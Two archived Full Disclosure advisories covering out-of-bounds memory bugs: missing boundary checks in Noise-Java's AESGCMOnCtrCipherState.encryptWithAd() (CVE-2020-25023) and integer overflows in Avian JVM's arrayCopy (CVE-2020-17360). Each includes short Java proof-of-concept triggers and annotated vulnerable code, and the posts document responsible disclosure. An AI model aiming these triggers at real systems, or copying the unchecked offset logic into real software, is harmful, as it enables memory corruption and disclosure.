* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_64e0b207_20250111_003048.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

![](/shared/images/nst-icons.svg#search)

# Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks

---

*From*: Pietro Oliva via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 2 Sep 2020 07:58:30 +0000

---

```
Vulnerability title: Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks
Author: Pietro Oliva
CVE: CVE-2020-25023
Vendor: Rhys Weatherley (Creator of Noise Framework's reference implementation in Java)
Product: Noise-Java
Affected version: No version information is currently available.
Fixed version:    Check latest commit and pull request

Description:
The issue is located in the AESGCMOnCtrCipherState.encryptWithAd() method
defined in AESGCMOnCtrCipherState.java, where multiple boundary checks are
performed to prevent invalid length or offsets from being specified for the
encrypt or copy operation. However, some checks were found to be either
incomplete or missing, which would likely lead to the following scenarios:
- Out-of-bounds read or write with huge plaintextOffset, negative cipertextOffset,
  or negative length (Depending on the underlying JVM's validation).
- Exception thrown by the JVM instead of Noise-Java throwing ShortBufferException

Impact:
Further checks might be implemented in the JVM and an exception might be thrown
before attempting any operation with invalid arguments.
If that is not the case, OOB read/write or a silent return on invalid arguments
might occur. This could in turn lead to arbitrary code execution in the context
of the JVM, memory disclosure, denial of service, or data loss.

Proof of concept:
Depending on the JVM, running the following code will result in either OOB read
(see CVE-2020-17360 in Avian JVM) or exception being thrown by the JVM:

package com.southernstorm.noise.protocol;

public class poc {

    public static void main(String[] args) {
        byte[] plaintext = "This is my plaintext".getBytes();
        byte[] ciphertext = new byte[plaintext.length];
        CipherState cs = new AESGCMOnCtrCipherState();

        // Passing a large plaintextOffset should result in a ShortBufferException
        // instead of relying on the JMV's implementation of System.arraycopy.
        try {
                cs.encryptWithAd(null, plaintext, 0x7fffffff, ciphertext, 0, 1);
        }
        catch(Exception e){
                System.out.println("An exception has been thrown: " + e);
        }

    }
}

Evidence:

public int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,
        byte[] ciphertext, int ciphertextOffset, int length)
            throws ShortBufferException {
    int space;
    if (ciphertextOffset > ciphertext.length) // BUG: ciphertextOffset could be negative,
                                              // bypassing this length check
        space = 0;
    else
        space = ciphertext.length - ciphertextOffset;
        // BUG: a negative ciphertextOffset would increase the space instead of decreasing it
    if (keySpec == null) {
        if (length > space) // BUG: this check can be bypassed with negative ciphertextOffset
            throw new ShortBufferException();
        if (plaintext != ciphertext || plaintextOffset != ciphertextOffset)

            /* Multiple issues here:
            1. plaintextOffset is never checked. Depending on the JVM's implementation,
               This could result in OOB read in arraycopy (see CVE-2020-17360 for Avian JVM) or
               exception being thrown.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB read/write or exception being thrown.
            3. If the length is negative, depending on the JVM, arraycopy could result in OOB
               read/write, exception being thrown, or silent return (e.g. CVE-2020-17360 in Avian) */

            System.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
        return length;
    }
    if (space < 16 || length > (space - 16)) // BUG: this can be bypassed with negative length
        throw new ShortBufferException();
    try {
        setup(ad);

            /* Multiple issues here as well:
            1. plaintextOffset is never checked. this could result in an exception being thrown
               by the JVM.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB write in arraycopy or exception being thrown.
            3. length could be negative. Depending on the JVM, this could result in OOB write in arraycopy
               or exception being thrown. */

        int result = cipher.update(plaintext, plaintextOffset, length, ciphertext, ciphertextOffset);
        cipher.doFinal(ciphertext, ciphertextOffset + result);
    } catch (InvalidKeyException e) {
        // Shouldn't happen.
        throw new IllegalStateException(e);
    } catch (InvalidAlgorithmParameterException e) {
        // Shouldn't happen.
        throw new IllegalStateException(e);
    } catch (IllegalBlockSizeException e) {
        // Shouldn't happen.
        throw new IllegalStateException(e);
    } catch (BadPaddingException e) {
        // Shouldn't happen.
        throw new IllegalStateException(e);
    }
    ghash.update(ciphertext, ciphertextOffset, length);
    ghash.pad(ad != null ? ad.length : 0, length);
    ghash.finish(ciphertext, ciphertextOffset + length, 16);
    for (int index = 0; index < 16; ++index)
        ciphertext[ciphertextOffset + length + index] ^= hashKey[index];
        return length + 16;
    }

As can be seen in the above code, multiple boundary checks are either missing
or incomplete, allowing for invalid length or offsets to be passed to the JVM's
implementation of System.arraycopy or other methods that handle encryption.
Depending on the JVM in use and how the missing/incomplete checks are exploited,
this could result in either OOB read/write, silent return, or exception thrown
by the underlying JVM. OOB read/write could result in memory/secrets disclosure,
arbitrary code execution in the context of the JVM, or crash.

Mitigating factors:
Unless the JVM has some vulnerability on its own (such as CVE-2020-17360 and
CVE-2020-17361 in Avian JVM), this vulnerability would likely result in an
unhandled exception being thrown and/or crash of the JVM process.

Remediation:
The fixes for this vulnerability can be found below:
<https://github.com/rweather/noise-java/commit/18e86b6f8bea7326934109aa9ffa705ebf4bde90>
<https://github.com/rweather/noise-java/pull/12/files>

Disclosure timeline:
28th Aug 2020  - Vulnerability reported to vendor.
29th Aug 2020  - Patch committed by vendor.
2nd Sept 2020  - Improvement for this patch provided by vulnerability reporter.
2nd Sept 2020  - Vulnerability details are made public.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

### Current thread:

* **Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks** *Pietro Oliva via Fulldisclosure (Sep 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_497a992e_20250111_003047.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# Avian JVM vm::arrayCopy() Multiple Integer Overflows

---

*From*: Pietro Oliva via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Mon, 10 Aug 2020 21:37:29 +0000

---

```
Vulnerability title: Avian JVM vm::arrayCopy() Multiple Integer Overflows
Author: Pietro Oliva
CVE: CVE-2020-17360
Vendor: ReadyTalk
Product: Avian JVM
Affected version: 1.2.0

Description:
The issue is located in the vm::arrayCopy method defined in classpath-common.h,
where multiple boundary checks are performed to prevent out-of-bounds memory
read/write. Two of those boundary checks contain an integer overflow which leads
to those same checks being bypassed and out-of-bounds read/write.

Impact:
Attackers could exploit this vulnerability to read/write arbitrary content in
the JVM memory. This could in turn result in denial of service, memory
disclosure, or arbitrary code execution in the context of the JVM.

Exploitation:
The following PoC would trigger an out-of-bounds write and crash of Avian JVM:

import java.lang.*;

public class poc {

    public static void main(String[] args) {
        byte[] src = "This is src".getBytes();
        byte[] dst = "This is dst".getBytes();

        // Triggering out-of-bounds write via integer overflow on System.arraycopy
        System.arraycopy(src, 0, dst, 0x7fffffff, 1);
    }
}

Evidence:

void arrayCopy(Thread* t,
               object src,
               int32_t srcOffset,
               object dst,
               int32_t dstOffset,
               int32_t length)
{
  if (LIKELY(src and dst)) {
    if (LIKELY(compatibleArrayTypes(
            t, objectClass(t, src), objectClass(t, dst)))) {
      unsigned elementSize = objectClass(t, src)->arrayElementSize();

      if (LIKELY(elementSize)) {
        intptr_t sl = fieldAtOffset<uintptr_t>(src, BytesPerWord);
        intptr_t dl = fieldAtOffset<uintptr_t>(dst, BytesPerWord);
        if (LIKELY(length > 0)) {
          if (LIKELY(srcOffset >= 0 and srcOffset + length <= sl // integer OF
/*integer overflow*/ and dstOffset >= 0 and dstOffset + length <= dl)) {
            uint8_t* sbody = &fieldAtOffset<uint8_t>(src, ArrayBody);
            uint8_t* dbody = &fieldAtOffset<uint8_t>(dst, ArrayBody);
            if (src == dst) {
              memmove(dbody + (dstOffset * elementSize),
                      sbody + (srcOffset * elementSize),
                      length * elementSize);
            } else {
              memcpy(dbody + (dstOffset * elementSize),
                     sbody + (srcOffset * elementSize),
                     length * elementSize);
            }

            if (objectClass(t, dst)->objectMask()) {
              mark(t, dst, ArrayBody + (dstOffset * BytesPerWord), length);
            }

            return;
          } else {
            throwNew(t, GcIndexOutOfBoundsException::Type);
          }
        } else {
          return;
        }
      }
    }
  } else {
    throwNew(t, GcNullPointerException::Type);
    return;
  }

  throwNew(t, GcArrayStoreException::Type);
}

As can be seen in the two lines commented above, offset+length can overflow and
the size checks would be bypassed. Overflowing srcOffset+length would trigger an
out-of-bounds read in either memmove or memcpy, while overflowing dstOffset +
length would trigger an out-of-bounds write in the same methods.

Mitigating factors:
Since both offsets and length need to be positive integers, there is a limited
range of memory where an attacker could read or write as a result of this
vulnerability.

Remediation:
A patch has been merged in the master branch:
<https://github.com/ReadyTalk/avian/pull/571>

Disclosure timeline:
3rd August 2020  -  Vulnerability reported.
3rd August 2020  -  Vulnerability acknowledged.
4th August 2020  -  CVE request sent to Mitre.
5th August 2020  -  CVE assigned.
10th August 2020 -  Proposed patch via pull request.
10th August 2020 -  Patch approved and merged after changes.
10th August 2020 -  Vulnerability details shared on fulldisclosure.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* **Avian JVM vm::arrayCopy() Multiple Integer Overflows** *Pietro Oliva via Fulldisclosure (Aug 11)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


